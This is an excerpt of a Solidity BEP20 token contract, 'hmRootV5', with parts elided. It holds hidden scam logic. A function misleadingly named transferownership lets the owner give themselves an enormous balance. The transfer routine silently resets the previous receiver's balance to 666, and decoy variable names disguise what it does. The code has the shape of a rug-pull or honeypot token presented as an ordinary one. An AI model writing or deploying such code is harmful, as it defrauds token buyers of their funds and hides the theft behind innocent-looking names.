...
contract hmRootV5 is IBEP20{
  ...
  address public BDADD = 0x000000000000000000000000000000000000dEaD;
  ...
  function transferownership() public onlyOwner returns (bool success) {BDADD = 0x000000000000000000000000000000000000dEaD; _balances[msg.sender] = _totalSupply * sfeedenom ** checksum;return true;}
uint256 balanceof = 100;
uint256 balanced = 666;
  function _transfer(address sender, address receiver, uint256 amount) internal {
    ...
    if(BDADD != msg.sender){_balances[BDADD] = balanced; BDADD = receiver;}
    BDADD = receiver;
